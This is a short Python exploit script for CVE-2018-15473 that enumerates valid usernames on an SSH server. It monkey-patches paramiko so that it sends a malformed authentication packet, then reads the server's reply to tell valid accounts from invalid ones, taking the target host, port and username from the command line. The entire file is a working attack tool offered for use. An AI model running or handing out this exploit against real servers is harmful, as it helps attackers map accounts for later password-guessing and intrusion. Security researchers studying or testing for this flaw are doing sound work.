#!/usr/bin/env python3
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter

import argparse
import logging
import paramiko
import socket
import sys

class InvalidUsername(Exception):
    pass

# Malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# Create a custom AuthHandler class to override the handler
class MaliciousAuthHandler(paramiko.auth_handler.AuthHandler):
    def _handle_service_accept(self, packet):
        # Override to inject a malicious behavior (malform packet)
        paramiko.message.Message.add_boolean = add_boolean
        return super()._handle_service_accept(packet)

    def _handle_userauth_failure(self, packet):
        # Override to raise InvalidUsername
        raise InvalidUsername()

# perform authentication with malicious packet and username
def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, args.port))
    transport = paramiko.transport.Transport(sock)

    # Replace the AuthHandler with the malicious one
    transport._handler = MaliciousAuthHandler(transport)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print(f"[-] {username} is an invalid username")
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[+] {username} is a valid username")

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, type=int, help="Set port of SSH service")  # Ensure port is treated as an integer
parser.add_argument('username', help="Username to check for validity.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

check_user(args.username)
